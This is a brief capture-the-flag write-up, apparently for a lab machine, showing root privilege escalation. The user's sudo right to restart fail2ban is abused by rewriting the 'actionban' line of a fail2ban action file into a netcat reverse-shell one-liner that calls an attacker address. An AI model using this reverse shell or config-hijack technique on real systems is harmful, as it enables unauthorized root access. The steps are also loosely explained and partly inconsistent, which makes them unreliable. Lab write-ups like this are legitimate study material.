Once connected to the michael@10.10.11.166 by the command:

sudo ssh -i ./content/id_rsa_michael michael@10.10.11.166

We check our privliges by: sudo -l

We notify there's a restart action for a service we are allowed as michael

" (root) NOPASSWD: /etc/init.d/fail2ban restart"

We need to modidy the "/etc/fail2ban/action.d/iptable-multiform.conf" file

Changing the line of "actionban" by

actionban = rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.83 4242 >/tmp/f

then we restart the service by:

sudo /etc/init.d/fail2ban restart

then, we call a bash by

bash -p

Now, we are root, and we can extract the root.txt !
